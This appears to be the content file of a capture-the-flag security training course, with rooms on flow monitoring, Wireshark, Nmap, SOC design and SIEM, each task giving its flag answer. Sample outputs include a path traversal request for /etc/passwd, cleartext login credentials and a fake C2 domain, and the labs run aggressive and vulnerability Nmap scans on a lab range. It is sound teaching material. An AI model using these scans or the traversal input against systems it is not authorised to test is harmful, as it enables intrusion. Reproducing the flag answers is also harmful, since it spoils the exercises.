tasks.chal: Which protocol polls devices for counters and metrics (use v3 for auth + privacy)? Submit TG{••••}.
tasks.learn: SNMP — metrics by polling OIDs or receiving traps. Use SNMPv3; v1/v2c community strings are cleartext and sniffable.
tasks.example: Metric baseline: a WAN link at 30% utilisation normally; a sustained 95% is either growth (capacity) or abuse (DoS) — the metric tells you to look.

tasks.title: The pipeline & the stack
tasks.teach: Every monitoring system follows the same pipeline: collect → store → visualise → alert → act. Agents/exporters collect; a time-series database or SIEM stores; dashboards visualise; alert rules watch; and people (or automation) act. A common open stack is Prometheus (collect + store metrics) with Grafana (dashboards), alongside flow (nfdump/Zeek) and log (syslog) collectors.
tasks.chal: Name the popular open dashboarding tool that visualises metrics from a store like Prometheus. Submit TG{•••••••}.
hints: Pretty dashboards on top of a TSDB.
tasks.learn: Grafana — the visualise stage. The pipeline is collect → store → visualise → alert → act; a dashboard nobody watches still needs alert rules.
tasks.example: Prometheus scrapes exporters and stores metrics; Grafana draws the dashboards and fires alerts when a query crosses a line.

tasks.title: Thresholds vs anomaly
tasks.teach: Alerts come in two flavours. A static threshold fires when a value crosses a fixed line ('CPU > 90%') — simple, but blind to context (90% might be normal at backup time). Anomaly / baseline detection fires on deviation from the learned normal, catching the subtle stuff a fixed line misses, at the cost of more tuning. Good monitoring uses both: thresholds for the obvious, anomaly for the sneaky.
tasks.chal: Which alerting approach fires on deviation from the learned baseline rather than a fixed value? Submit TG{•••••••}.
hints: Not a fixed line — a deviation.
tasks.learn: Anomaly (baseline) detection — catches 'unusual for this host/time' that a static threshold would miss. Combine with thresholds.
tasks.example: Threshold: 'alert if outbound > 1 GB/h.' Anomaly: 'alert if this host's outbound is 50× its own normal' — catches a slow leak the threshold never trips.

tasks.title: Catch the attack in the flows
tasks.teach: Monitoring is security telemetry, not just ops. In the flows you can see the whole attack lifecycle without a single payload: a scan (one host touching many hosts/ports), a beacon (small regular flows to one external IP), exfiltration (a large outbound transfer), and lateral movement (internal host-to-host on SMB/RDP). The giveaway is always a deviation from baseline — odd destination, timing, direction or volume.
tasks.chal:
09:21 flow 10.10.10.21 -> 185.x.x.x:443 8 pkts every 60s # beacon 09:40 flow 10.10.10.21 -> 185.x.x.x 12 MB outbound # ???

A host suddenly sends 12 MB outbound to an external IP. Which attack phase is this? Submit TG{••••••••••••}.
tasks.learn: Exfiltration — the large outbound transfer after the beacon. Flows revealed the beacon and the theft, with no payload capture needed.
tasks.example: Lifecycle in flows: scan → beacon (C2) → exfiltration. Each is a baseline deviation in destination, timing or volume.

lab.intro: Spot the exfiltration flow for a suspect host.
steps2: Filter flows for the host’s external traffic in nfdump
Spot the large outbound transfer after the beacon
Name that attack phase (one word).

tasks.title: Top talkers
tasks.teach: A fast, powerful flow query is the top talkers report — rank hosts or conversations by bytes or flows. It instantly surfaces the heaviest users (capacity planning) and the abnormal ones (a workstation that is suddenly a top talker outbound is suspicious). It is often the first thing you run when 'the network is slow' or 'something feels off'.
tasks.chal: What is the flow report that ranks hosts/conversations by traffic volume called (two words)? Submit TG{•••_•••••••}.
tasks.learn: Top talkers — nfdump -s ip/bytes. Great for capacity and for spotting a host that should not be near the top.
tasks.example: A database server topping the list is expected; a single user workstation topping outbound bytes is a hunt lead.

tasks.title: Actionable alerts
tasks.teach: An alert that is not actionable is noise, and noise trains people to ignore alerts — the monitoring version of alert fatigue. A good alert is specific (names the host/metric), has context (current vs baseline), has a clear owner and next step, and is tuned so it fires rarely and meaningfully. Secure the monitoring too: use SNMPv3, protect the collector, and avoid blind spots (encrypted east-west, cloud).
tasks.chal: Which SNMP version must you use so metric polling is authenticated and encrypted? Submit TG{••••••}.
tasks.learn: SNMPv3 — auth + privacy. v1/v2c leak community strings. Secure the monitoring plane itself; it sees sensitive data.
tasks.example: Bad alert: 'high traffic'. Good alert: 'web1 outbound 50× baseline for 10 min, owner: NetOps, runbook: #NM-07.'

tasks.title: Scenario: the breach the flows revealed
tasks.teach:
In the handbook incident, signatures caught nothing — the traffic was encrypted. But the flows told the whole story: a workstation beaconing to a new external IP every 60 seconds, then a 12 MB outbound transfer. Historical flow data let the team reconstruct exactly what happened and when. This practice — using flows, metadata and packets to detect and investigate attacks on the network — has a name.

🔑 Key point

NSM — Network Security Monitoring. Even against TLS, flow metadata (timing, destination, volume) reveals beacons and exfiltration. Keep historical flows for reconstruction.
tasks.chal: Using network telemetry (flows, metadata, packets) to detect and investigate attacks is called Network Security Monitoring. Submit its abbreviation TG{•••}.
tasks.learn: NSM — Network Security Monitoring. Even against TLS, flow metadata (timing, destination, volume) reveals beacons and exfiltration. Keep historical flows for reconstruction.
tasks.example: The win: baseline + retained flows meant the team answered 'what did the attacker do, and when?' precisely — from metadata alone.

rooms.title: Wireshark
rooms.subtitle: Read the wire byte by byte — capture, filter, follow and reconstruct.
rooms.blurb: Capture safely, use capture vs display filters, follow streams, read statistics, and reconstruct an incident.

tasks.title: When to reach for packets
tasks.teach:
Wireshark is the defender's microscope. Flows and logs tell you that something happened and who was involved; only packets tell you exactly what crossed the wire — the precise request, the payload, the protocol behaviour byte by byte. You reach for packets when the question is 'what exactly did it send?', when you need to see how a protocol really behaved, or when logs and flows disagree and you need ground truth.

The discipline: capture surgically, not everything. Analysts who try to capture the whole network drown in data; those who capture the right link with the right filter get precise answers fast. The companion CLI is tshark, and dumpcap is the lightweight capture engine.

🔑 Key point

Stream — Follow TCP/HTTP/TLS Stream reassembles the whole conversation so you read it as one piece, not packet by packet.
tasks.chal: To read exactly what two hosts exchanged, you right-click a packet and Follow the ___. Submit TG{••••••}.
tasks.learn: Stream — Follow TCP/HTTP/TLS Stream reassembles the whole conversation so you read it as one piece, not packet by packet.
tasks.example: Flows: '10.10.10.21 talked to 10.10.30.12:80, 40 KB.' Packets: 'it POSTed password=secret to /login' — only packets show the content.

tasks.title: Capture vs display filter
tasks.teach: Wireshark has two completely different filter systems and confusing them is the classic beginner mistake. A capture filter (BPF syntax, e.g. host 10.10.10.30 and tcp port 443) decides what to record — it is applied before capture, so anything it excludes is gone forever. A display filter (e.g. ip.addr==10.10.10.30 && tcp.port==443) decides what to show from what you already recorded — you can change it freely without losing data.
tasks.chal: Which filter decides what gets recorded to disk (applied before capture, BPF syntax)? Submit TG{•••••••_••••••}.
tasks.learn: Capture filter — BPF, applied before capture; excluded traffic is lost. Display filters only change the view of what you kept.
tasks.example: Capture (BPF): host 10.10.10.30 and tcp port 443. Display: ip.addr==10.10.10.30 && tcp.port==443 — same idea, different syntax and timing.

tasks.title: Display filters
tasks.teach:
Display filters are how you find the needle. A few you use constantly: ip.addr==A (traffic to/from a host), tcp.port==443 or just http/dns/tls (a service), http.request (only HTTP requests), dns.qry.name contains "example" (DNS for a name), and tcp.flags.syn==1 && tcp.flags.ack==0 (only new-connection SYNs). Custom columns (e.g. http.host, dns.qry.name) let you see the key field without opening each packet.

🔑 Key point

http.request — every HTTP request in the capture. Combine with columns like http.host to triage fast.

Key term: HTTP.REQUEST
tasks.chal: Which display filter shows only HTTP requests? Submit TG{••••.•••••••}.
tasks.learn: http.request — every HTTP request in the capture. Combine with columns like http.host to triage fast.
tasks.example: tshark -r cap.pcapng -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri lists who requested what.

lab.intro: Pull every HTTP request out of a capture.

steps.cmd: tshark -r cap.pcapng -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
steps.out:
10.10.10.21  intranet.tg  /login
10.10.10.21  intranet.tg  /admin
10.10.10.50  intranet.tg  /../../etc/passwd   <- traversal attempt

sugg: tshark -r cap.pcapng -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri

steps2: In Wireshark type the display filter for HTTP requests, or run the tshark above
Review who requested what
Submit the display filter you used (http dot request).

tasks.title: The three panes
tasks.teach: Wireshark shows every packet in three stacked panes. The packet list (top) is one row per packet: number, time, source, destination, protocol, info. The packet details (middle) decodes the selected packet layer by layer — Ethernet, IP, TCP, then the application protocol — each expandable. The packet bytes (bottom) is the raw hex and ASCII. Reading top-to-bottom goes from 'what is this' to 'every field inside it'.
tasks.chal: Which pane decodes the selected packet layer by layer (Ethernet → IP → TCP → app)? Submit TG{••••••_•••••••}.
tasks.learn: Packet details — the layered decode. 'Expert Info' here flags retransmissions, resets and malformed packets automatically.
tasks.example: Expand TCP in the details pane to read the flags, sequence numbers and window — how you tell a handshake from a scan from a reset.

tasks.title: Follow the stream
tasks.teach: The single most useful action in Wireshark is Follow Stream (right-click → Follow → TCP/HTTP/TLS Stream). It reassembles a whole conversation into readable text — so an HTTP login, a file transfer, or a command channel reads like a transcript. On cleartext protocols, credentials and file contents are often visible directly. The display filter http.request.method=="POST" jumps you straight to form submissions.
tasks.chal:
POST /login HTTP/1.1 Host: intranet.tg Content-Type: application/x-www-form-urlencoded user=rnehra&password=Winter2026! <- cleartext credentials over HTTP

Which HTTP method (filter http.request.method=="?") carries form submissions like a login? Submit TG{••••}.
tasks.learn: POST — form submissions. Over plain HTTP the credentials are right there in the followed stream; this is why internal apps must use TLS.
tasks.example: Finding: a POST to /login over HTTP exposes password=Winter2026! in cleartext — a real, common lab finding.

lab.intro: Extract the cleartext POST bodies from a capture.

steps.out:
user=rnehra&password=Winter2026!
user=admin&password=changeme

steps2: Filter for POSTs (or Follow HTTP Stream on a login packet)
Read the submitted form body
Submit the HTTP method that carries it.

tasks.title: Read the handshake & scans
tasks.teach:
TCP's behaviour is legible in the flags, and a filter for new-connection attempts is one of the most useful you own: tcp.flags.syn==1 && tcp.flags.ack==0 shows only the opening SYNs. A healthy connection is SYN → SYN-ACK → ACK. A port scan looks like many SYNs to many ports with few SYN-ACKs back. A filtered port is a SYN with no reply at all (firewall drop); a refused port is SYN then RST.

🔑 Key point

tcp.flags.syn==1 — isolates connection openings, so a scan (many SYNs, few SYN-ACKs) jumps out immediately.

Key term: TCP.FLAGS.SYN==I
tasks.chal: Which display filter shows only the SYN packets (new connection attempts)? Submit TG{•••.•••••.•••==•}.
hints: tcp dot flags dot syn equals 1.
tasks.learn: tcp.flags.syn==1 — isolates connection openings, so a scan (many SYNs, few SYN-ACKs) jumps out immediately.
tasks.example: SYN, no reply = filtered (firewall drop). SYN then RST = refused (port closed). SYN then SYN-ACK = open. The capture tells you which, instantly.

lab.intro: Isolate the connection attempts to spot a scan.

steps.cmd: tshark -r cap.pcapng -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.src -e tcp.dstport

sugg: tshark -r cap.pcapng -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.src -e tcp.dstport

steps2: Apply the SYN-only display filter
One source hitting many ports = a scan
Submit the display filter for SYN packets.

tasks.title: Statistics find the needle
tasks.teach: You rarely scroll through packets one by one — Wireshark's Statistics menu points you at the interesting ones. Conversations lists every host pair with byte counts (find the big or odd one). Protocol Hierarchy shows what protocols are in the capture and how much (spot unexpected ones). The I/O Graph plots traffic over time — the fastest way to see a beacon, because a beacon is a regular blip at a fixed interval.
tasks.chal: Which Statistics view plots traffic over time, making a regular-interval beacon visible as evenly spaced spikes? Submit TG{••_•••••}.
tasks.learn: I/O Graph — a beacon shows as evenly spaced spikes. Conversations and Protocol Hierarchy are the other two needle-finders.
tasks.example: tshark -q -z conv,tcp (conversations) and -q -z io,phs (protocol hierarchy) give the same views on the CLI.

lab.intro: Rank the TCP conversations to find the heavy/odd pair.
steps2: Run tshark -r cap.pcapng -q -z conv,tcp (or Statistics > Conversations)
The regular small flow to an external IP is a beacon
Which Statistics graph shows it best over time? (two words)

tasks.title: Detect a port scan
tasks.teach: Packets make attacks concrete. A port scan is unmistakable in a capture: one source sending many SYNs to many destination ports, with few or no SYN-ACKs in return. The tcp.flags.syn==1 && tcp.flags.ack==0 filter plus the Conversations view confirms it in seconds — and shows you exactly which ports the attacker was interested in.
tasks.chal: One host sending SYNs to dozens of ports with almost no replies is which activity? Submit TG{••••_••••}.
tasks.learn: Port scan — many SYNs, few SYN-ACKs, from one source. The packets reveal the exact ports probed, feeding your response.
tasks.example: Follow-up: the ports that did answer (SYN-ACK) are the attacker's next targets — triage those services first.

tasks.title: tshark for scale
tasks.teach: The GUI is for exploration; tshark is for scale and scripting. It reads a capture (-r cap.pcapng), applies a display filter (-Y), prints chosen fields (-T fields -e ...), and runs the same statistics (-q -z conv,tcp). It is how you process huge captures, extract fields for a report, or pull DNS names and sort them — all from the command line.
tasks.chal:
$ tshark -r cap.pcapng -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn 312 intranet.tg 9 updates.windows.com 3 k7f3n2.evil-c2.top <- rare, odd domain worth hunting

Name the command-line companion to Wireshark used for large captures and scripting. Submit TG{••••••}.
tasks.learn: tshark — same decoders, scriptable. Perfect for extracting fields, counting DNS names, or crunching captures too big for the GUI.
tasks.example: The rarely-seen domain in a frequency count is a classic hunt lead — tshark surfaces it from millions of packets in one line.

lab.intro: Rank the DNS names in a capture to find the odd one.

steps.cmd: tshark -r cap.pcapng -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn
steps.out:
312 intranet.tg
    9 updates.windows.com
    3 k7f3n2.evil-c2.top   <- rare DGA-looking domain

sugg: tshark -r cap.pcapng -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn

steps2: Extract DNS names with the tshark pipeline above
The rare, random-looking domain is the hunt lead
Name the CLI tool (one word).

tasks.title: Scenario: packets settle it
tasks.teach: The logs disagreed. The firewall said a connection to a server 'timed out'; the app team swore the server was up; the user said the page 'just hung'. Only the capture settled it: the client's SYN went out and no SYN-ACK came back — the firewall was silently dropping the traffic (filtered), not the server being down. Packets are ground truth: when flows and logs conflict, the capture ends the argument.
tasks.chal: A SYN with no reply at all (vs SYN then RST) means the traffic was dropped by a firewall — i.e. the port is ___? Submit TG{••••••••}.
tasks.learn: Filtered — a firewall dropped it (no reply). RST would mean refused; SYN-ACK would mean open. The packets gave the definitive answer.
tasks.example: Reconstruction is Wireshark's superpower: capture → filter to the flow → read the flags/stream → state exactly what happened and why.

rooms.title: Nmap Network Scanning
rooms.subtitle: Scan, discover, map — then read the results like an analyst.
rooms.blurb: A practical, hands-on room: craft the right scans and read real Nmap output to capture the flags. Lab range is TG-LAB 10.10.10.0/24.

tasks.title: A legal target
tasks.teach: Port-scanning hosts you are not authorised to test can be unlawful. There is exactly one public host the Nmap project lets anyone scan to test their install.
tasks.chal: Name that host (it appears in the handbook setup lab). Submit it as the flag, e.g. TG{host.example.com}.
hints: The Nmap project provides it explicitly for test scans.
tasks.learn: scanme.nmap.org — the one host you may freely (and lightly) scan. Everything else needs written authorisation.
tasks.example: Everyday: you only test the lock on your own door — scanning someone else's network uninvited is rattling their doors.

tasks.title: Default behaviour
tasks.teach:
Run nmap <target> as root and Nmap defaults to a fast, stealthy half-open scan. Run it as a normal user and it falls back to a full-connect scan (-sT).

🔑 Key point

-sS — the SYN scan. It never completes the handshake, so it is fast and quieter than -sT.
tasks.chal: Which flag is that default root scan? Submit TG{-••}.
tasks.learn: -sS — the SYN scan. It never completes the handshake, so it is fast and quieter than -sT.
tasks.example: Everyday: a quiet knock that listens for an answer without fully committing — fast and relatively polite.

tasks.title: Read the sweep
tasks.teach: You run a ping sweep of the lab to list live hosts. Your baseline says only .1, .10 and .30 should be up.
tasks.chal:
$ sudo nmap -sn 10.10.10.0/24 -oA sweep Starting Nmap 7.94 ( https://nmap.org ) Nmap scan report for 10.10.10.1 Host is up (0.0011s latency). Nmap scan report for 10.10.10.10 Host is up (0.0013s latency). Nmap scan report for 10.10.10.30 Host is up (0.0009s latency). Nmap scan report for 10.10.10.77 Host is up (0.0021s latency). Nmap done: 256 IP addresses (4 hosts up) scanned in 2.37s

One host is up that the baseline does not list. Submit its IP as TG{10.10.10.x}.
hints: -sn is a ping scan — live hosts, no port scan.
Compare the four "up" hosts against the baseline .1 / .10 / .30.
tasks.learn: 10.10.10.77 — the unexpected host. A ping sweep vs a known baseline is exactly how you spot a rogue device in incident response.
tasks.example: Everyday: a roll-call down the street — 'who's home?' — before knocking on individual doors.

tasks.title: Open everything
tasks.teach:
The rogue host needs a thorough look. By default Nmap only checks the top ~1000 ports; you want all 65,535 TCP ports.

🔑 Key point

-p- — scans all 65,535 ports (thorough, slower). -F is the opposite (fast, top 100).
tasks.chal: Which port flag scans every TCP port? Submit TG{-•-}.
hints: A dash, p, and a dash.
tasks.learn: -p- — scans all 65,535 ports (thorough, slower). -F is the opposite (fast, top 100).
tasks.example: Everyday: checking every window of a building, not just the front door, to see which are open.

tasks.title: Read the versions
tasks.teach:
You run a version scan on the rogue host.

🔑 Key point

Apache 2.4.52. A database (MySQL) reachable from a user VLAN plus an admin panel on 8080 is a serious finding — -sV turns open ports into actionable detail.

Key term: APACHE 2.A.S2
tasks.chal:
$ sudo nmap -sV -p- --open 10.10.10.77 PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) 3306/tcp open mysql MySQL 8.0.32-0ubuntu0.22.04 8080/tcp open http-proxy

Read the output: what exact web-server product and version is serving port 80? Submit it as TG{••••••_•.•.••} (product_version).
hints: Look at the VERSION column for the 80/tcp line.
Product then version, joined with an underscore.
tasks.learn: Apache 2.4.52. A database (MySQL) reachable from a user VLAN plus an admin panel on 8080 is a serious finding — -sV turns open ports into actionable detail.
tasks.example: Everyday: not just 'a door is open' but 'it's a 2019 model X lock' — enough to look up its known weaknesses.

tasks.title: Grep the greppable
tasks.teach:
Nmap can write a greppable file (.gnmap) you can filter with grep. You pull just the open ports from an audit:

🔑 Key point

8080 — the admin panel. Greppable output lets you script triage across hundreds of hosts.
tasks.chal:
$ grep -E "^[0-9]+/tcp\s+open" audit.nmap 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy

Besides the usual 22 and 80, which non-standard port is open? Submit TG{••••}.
tasks.learn: 8080 — the admin panel. Greppable output lets you script triage across hundreds of hosts.
tasks.example: Everyday: turning a long report into the one line you can actually act on.

tasks.title: All in one
tasks.teach: One flag bundles version detection, OS detection, default scripts and traceroute into a single aggressive scan.
tasks.chal: Which flag is it? Submit TG{-•}.
hints: A dash and one capital letter.
tasks.learn: -A — the all-in-one. Great for depth on a single host (sudo nmap -A 10.10.10.77); too loud for stealth.
tasks.example: Everyday: the full home inspection — ports, versions, OS and scripts in one noisy but thorough pass.

tasks.title: Script the SMB host
tasks.teach:
On a Windows host (10.10.10.10, port 445) you want the OS and domain details. The Nmap Scripting Engine (NSE) has a script for exactly this.

🔑 Key point

smb-os-discovery — returns OS, computer name and domain over SMB. --script-help <name> shows any script’s docs.
tasks.chal:
$ sudo nmap -p445 --script <script> 10.10.10.10

Which NSE script name discovers SMB/Windows OS info? Submit TG{•••-••-•••••••••}.
hints: It starts with smb- and ends with -discovery.
Used in the handbook as --script smb-os-discovery.
tasks.learn: smb-os-discovery — returns OS, computer name and domain over SMB. --script-help <name> shows any script’s docs.
tasks.example: Everyday: a specialist checklist run against one specific appliance to probe its known issues.

tasks.title: Hunt weaknesses
tasks.teach: NSE scripts are grouped into categories. One category runs a battery of vulnerability checks against a target.
tasks.chal: Complete the command sudo nmap --script ___ 10.10.10.30. Submit TG{••••}.
hints: The category is literally named after what it finds.
tasks.learn: --script vuln — runs the vuln category. Powerful but intrusive; only on authorised targets.
tasks.example: Everyday: running the 'known-faults' checklist to flag the risky items automatically.

tasks.title: Save it three ways
tasks.teach:
The -oA basename option writes the scan in three formats at once: a human-readable .nmap, a tool-friendly .xml, and a greppable one.

🔑 Key point

.gnmap — -oA audit gives you audit.nmap, audit.xml and audit.gnmap. Always save your scans.
tasks.chal: What is that third (greppable) file extension? Submit TG{•••••} (no dot).
tasks.learn: .gnmap — -oA audit gives you audit.nmap, audit.xml and audit.gnmap. Always save your scans.
tasks.example: Everyday: saving the same findings as a readable copy, a spreadsheet copy and a machine copy — one per audience.

rooms.title: SOC Architecture
rooms.subtitle: People, process and technology — the detection pipeline end to end.
rooms.blurb: Understand the SOC stack, the detection pipeline, analyst tiers, time sync and the metrics that run it.

tasks.title: What a SOC is
tasks.teach:
A Security Operations Centre (SOC) is the function that continuously monitors, detects, triages, investigates and responds to security events. It is built on three pillars — People (analysts and engineers), Process (runbooks, workflow, escalation) and Technology (SIEM, EDR, threat intel, SOAR). The crucial lesson up front: tools don't make a SOC. A pile of the best tools, half-configured and watched by no one, detects nothing; people and process turn tooling into protection.

Process is what makes a SOC's judgement consistent rather than improvised — the same alert is handled the same way whoever is on shift, because a runbook says how. That consistency is what lets a SOC scale and hand work over across shifts without dropping the ball.
tasks.chal: Which pillar covers the runbooks, workflow and escalation that make handling consistent? Submit TG{•••••••}.
tasks.learn: Process — people operate it, technology enables it, but process is what makes the SOC's response repeatable and reliable.
tasks.example: Same phishing alert, 2am or 2pm, new analyst or veteran: the runbook makes the first five steps identical. That is process.

tasks.title: The detection pipeline
tasks.teach:
Every SOC runs the same assembly line, and knowing it tells you where everything fits: Collect → Normalise → Enrich → Detect → Alert → Triage → Respond. Log sources produce telemetry; collectors ship it; the SIEM normalises raw logs into common fields and enriches them with context (threat intel, asset criticality, user); detection rules fire alerts; analysts triage and respond.

The enrich stage is what turns a bare log into a prioritised one — the same failed login means little until enrichment adds 'from a known-bad IP, against a domain admin, on a critical server'. Enrichment is how the SOC decides what matters.
tasks.chal: Which pipeline stage adds threat-intel, asset and user context so alerts can be prioritised? Submit TG{••••••}.
tasks.learn: Enrich — context added at ingest (TI, geo, asset, user) is what makes a raw event into an actionable, prioritised alert.
tasks.example: Raw: 'login failed for rnehra'. Enriched: 'login failed for domain-admin rnehra, src 203.0.113.9 (known C2), target DC01 (critical)'. Now you care.

tasks.title: Analyst tiers
tasks.teach: SOC work is layered by depth. Tier 1 monitors the alert queue, triages, closes false positives and escalates anything real or unclear. Tier 2 investigates escalations in depth, scopes incidents and builds timelines. Tier 3 / threat hunters do proactive hunting, complex IR and advanced analysis — and feed lessons back into detection. The whole machine is summed up in one line: alerts flow up, knowledge flows down.
tasks.chal: Which tier monitors the queue, triages alerts and escalates — the SOC's front line? Submit TG{••••_•}.
hints: The first responders to the queue.
tasks.learn: Tier 1 — triage and escalate. Today's hard Tier-3 escalation becomes tomorrow's automated Tier-1 triage as knowledge flows back down.
tasks.example: Flow: T1 sees '4625 brute force', escalates → T2 scopes the account and host → T3 hunts for similar, writes a better rule → T1 now auto-handles it.

tasks.title: The SOC stack
tasks.teach:
The core components and how data flows between them: log sources → collectors/forwarders → SIEM (store, normalise, correlate, detect — the central workbench) → alerts → case management ↔ SOAR / EDR. Threat intelligence enriches; dashboards report. Case management (TheHive, Jira, a vendor tool) is the system of record — every alert, investigation and incident tracked as a case, so nothing is lost and everything is auditable.

A common failure is tool sprawl: many half-configured tools instead of a small, well-run set. A lean SOC that fully uses five tools beats a sprawling one that half-uses twenty.
tasks.chal: Which component is the SOC's system of record, tracking every alert and incident as a case? Submit TG{••••_••••••••••}.
tasks.learn: Case management — the audit trail and memory of the SOC. Without it, investigations are lost and metrics are guesswork.
tasks.example: Data flow: source → collector → SIEM → alert → case opened → SOAR enriches/acts → analyst works the case → closed with notes that tune the next rule.

tasks.title: The SIEM at the heart
tasks.teach: At the centre of the stack sits the SIEM — Security Information and Event Management. It collects logs from everywhere, normalises and correlates them, and alerts on threats; it is both the live detection engine and the long-term store for search and reporting. Everything else in the SOC feeds it or acts on its output.
tasks.chal: What is the central platform that collects, normalises, correlates and alerts on logs? Submit TG{••••}.
tasks.learn: SIEM — the central detection engine and workbench. EDR, TI, SOAR and case management orbit it.
tasks.example: 'Many events in, few alerts out' — the SIEM's whole job is turning millions of raw events into a handful worth a human's time.

tasks.title: Operating models
tasks.teach: You can run a SOC several ways. In-house: your own team and tooling — full control and context, best for large orgs. MSSP / SOCaaS: monitoring outsourced to a provider — fast start, less overhead, good for smaller orgs. Virtual SOC: a distributed team with no dedicated room. Fusion centre: a SOC combined with threat intel, fraud, IR and risk — for mature, high-threat organisations.
tasks.chal: Which model outsources monitoring to a managed provider? Submit TG{••••}.
tasks.learn: MSSP (SOCaaS) — fast to stand up, less overhead; the trade-off is less context about your environment than an in-house team.
tasks.example: Many orgs run hybrid: in-house analysts for context and IR, an MSSP for 24/7 eyes-on-glass overnight.

tasks.title: Synchronise time first
tasks.teach: Before correlation can work, every source must agree on the time. If clocks drift, the SIEM lines up events in the wrong order and correlation becomes meaningless — the handbook's warning is blunt: without NTP, correlation is a lie. The very first configuration step when building a SOC is to point every host at the same time source via NTP.
tasks.chal:
$ timedatectl set-ntp true # Linux: enable NTP sync PS> w32tm /resync # Windows: force a time sync

What must every log source be synchronised to so correlation is valid? Submit TG{•••}.
tasks.learn: NTP — one time source for everything. This single step prevents a whole class of impossible-to-debug correlation failures.
tasks.example: Without it: DC01 says the login was 09:00, the firewall says the block was 08:55 — and the SIEM 'proves' the block happened before the login.

lab.intro: Confirm hosts are time-synced before trusting correlation.

steps.out:
Local time: Fri 2026-10-30 09:14:02 UTC
           NTP service: active
     System clock synchronized: yes   <- good, correlation is valid

steps2: On Linux: timedatectl (enable with timedatectl set-ntp true)
On Windows: w32tm /resync
Name the protocol every source must sync to.

tasks.title: Map detections to ATT&CK
tasks.teach: A baseline detection set (new admin account, brute force, malware execution, lateral movement, exfiltration) is the start — but how do you know what you can and can't detect? You map your detections to MITRE ATT&CK, the framework of real adversary tactics and techniques. That turns 'we have some rules' into 'here is exactly which attacker techniques we cover, and here are our gaps'.
tasks.chal: Which framework of adversary tactics/techniques do you map detections to for coverage? Submit TG{•••••_••••••}.
hints: Tactics and techniques; a big matrix.
tasks.learn: MITRE ATT&CK — map rules to techniques to see coverage and gaps. Detection-as-code plus ATT&CK is how mature SOCs measure themselves.
tasks.example: A gap view might show you detect T1110 (Brute Force) and T1059 (Command Shell) but have nothing for T1021 (Lateral Movement) — your next rule to write.

tasks.title: Measure the SOC
tasks.teach: You improve what you measure. The headline SOC metrics are MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond) — because detection time is damage: the longer an intrusion goes unseen, the worse it gets. Alongside them: alert volume, false-positive rate, and detection coverage (via ATT&CK).
tasks.chal:
SOC dashboard — last 30 days MTTD (mean time to detect) : 42 min MTTR (mean time to respond) : 3h 10m False-positive rate : 11%

Which metric measures how long it takes to detect an intrusion? Submit TG{••••}.
tasks.learn: MTTD — drive it down relentlessly; every minute undetected is damage done. MTTR measures how fast you then respond.
tasks.example: A SOC that cut MTTD from days to minutes turns 'breach' into 'blocked attempt' — the whole point of the function.

lab.intro: Read the SOC metrics dashboard.

steps.out:
MTTD : 42 min
MTTR : 3h 10m
Alerts/day : 86
False-positive rate : 11%

steps2: Open the SOC metrics dashboard (or query the SIEM)
Find the detect-time metric
Submit its 4-letter abbreviation.

tasks.title: Scenario: a phishing alert end to end
tasks.teach: A phishing alert fires. T1 reads it (who, what asset, rule confidence), confirms the user clicked, and escalates. T2 pivots across sources — email, proxy, EDR — builds a timeline, scopes which hosts and accounts are affected, and drives containment via the runbook. T3 hunts for others hit by the same campaign and writes a sharper detection. The tools mattered, but what made it work was people following process. The handbook's one-line truth: tools don't make a SOC.
tasks.chal: Beyond tooling, what actually makes a SOC effective (two things, joined)? Submit TG{••••••_•••_•••••••}.
tasks.learn: People and process — technology enables, but trained people following consistent process are what turn alerts into protection.
tasks.example: Same alert, two SOCs: one has a phishing runbook and owned escalation (contained in an hour); one has the same SIEM and nobody watching (breach for weeks).

rooms.title: SIEM — Security Monitoring at Scale
rooms.subtitle: Many events in, few alerts out — collect, normalise, correlate, alert.
rooms.blurb: Size by EPS, onboard and parse sources, write and tune correlation rules, enrich with TI and UEBA.

tasks.title: What a SIEM does
tasks.teach:
A SIEM (Security Information and Event Management) ingests logs from everywhere, normalises and correlates them, and emits a small list of alerts worth acting on. The whole value is that transformation: many events in, few alerts out. Millions of raw events per day enter on the left; a handful of high-confidence alerts leave on the right. (The TG handbooks use Innspark SIEM as the running example, paired with its SOAR, UEBA, NDR and threat-intel products.)

SIEM is historically two things fused: SIM (long-term storage, search, reporting) and SEM (real-time correlation and alerting). Together they give you both live detection and the history to investigate and prove what happened.
tasks.chal: 'Many events in, few ___ out' — what comes out of a SIEM? Submit TG{••••••}.
tasks.learn: Alerts — the SIEM's job is to compress a flood of events into a few that deserve attention. Everything it does serves that.
tasks.example: Input: 4,000,000 events/day. Output: ~80 alerts a human reads. The 50,000:1 compression is the product.

tasks.title: The SIEM pipeline
tasks.teach: Inside, the SIEM runs: Collect → Parse/Normalise → Enrich → Store/Index → Correlate → Alert. The step that makes everything downstream possible is normalisation — turning each source's wildly different raw format into common fields (user, source IP, action, time). Once every source speaks the same field names, you can write one rule that works across all of them.
tasks.chal:
raw: Oct30 09:14 dc01 Security 4625 user=rnehra src=203.0.113.9 status=0xC000006A norm: { time:..., host:dc01, event:4625, user:rnehra, src_ip:203.0.113.9, action:logon_failed }

What is the step that maps each source's raw format into common fields (user, src IP, action, time)? Submit TG{•••••••••••••}.
tasks.learn: Normalisation — the foundation. Without common fields, correlation across sources is impossible and rules break on every new format.
tasks.example: After normalisation, one rule event=logon_failed | count by user > 10 works for Windows, Linux and VPN logs alike.

tasks.title: EPS and sizing
tasks.teach: The number that governs SIEM sizing, licensing and performance is EPS — events per second, the rate at which logs arrive. You estimate it from your sources, then size storage as EPS × average event size × retention, with headroom. Underestimate EPS and the SIEM drops events (silent blind spots) or falls behind; overestimate and you overpay.
tasks.chal: What is the main SIEM sizing number — the ingest rate? Submit TG{•••}.
tasks.learn: EPS — events per second. It drives storage (EPS × event size × retention), licensing and whether the SIEM keeps up at peak.
tasks.example: 5,000 EPS × 500 bytes × 90 days ≈ 19 TB of hot storage — plan headroom for spikes (a scan or outage can multiply EPS).

tasks.title: Onboard and parse a source
